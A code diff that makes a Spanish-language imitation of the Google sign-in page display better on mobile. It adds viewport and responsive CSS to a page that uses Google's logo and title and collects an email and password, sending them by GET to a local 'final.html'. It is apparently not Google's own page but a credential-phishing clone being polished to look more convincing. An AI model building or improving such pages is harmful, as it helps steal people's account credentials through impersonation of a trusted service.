@@ -2,7 +2,8 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Iniciar sesion - Google</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión - Google</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -11,15 +12,18 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
+      padding: 10px;
     }
     .box {
       background: white;
-      padding: 40px;
+      padding: 40px 30px;
       width: 100%;
       max-width: 400px;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
+      box-sizing: border-box;
     }
     input {
       width: 100%;
@@ -28,6 +32,7 @@
       border: 1px solid #ccc;
       border-radius: 4px;
       font-size: 14px;
+      box-sizing: border-box;
     }
     button {
       background: #1a73e8;
@@ -42,20 +47,31 @@
     button:hover {
       background: #1558c0;
     }
+
+    /* RESPONSIVE */
+    @media (max-height: 500px) {
+      body {
+        align-items: flex-start;
+        padding-top: 30px;
+        height: auto;
+      }
+    }
+    @media (max-width: 400px) {
+      .box {
+        padding: 30px 20px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="box">
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" alt="Google"><br><br>
-    <h2>Iniciar sesion</h2>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" alt="Google" style="max-width: 100%; height: auto;"><br><br>
+    <h2>Iniciar sesión</h2>
     <form action="final.html" method="GET" autocomplete="on">
       <input type="email" name="email" autocomplete="email" placeholder="Correo electrónico o teléfono" required><br>
       <input type="password" name="password" autocomplete="current-password" placeholder="Contraseña" required><br>
       <button type="submit">Siguiente</button>
     </form>
-
   </div>
 </body>
 </html>
-
-
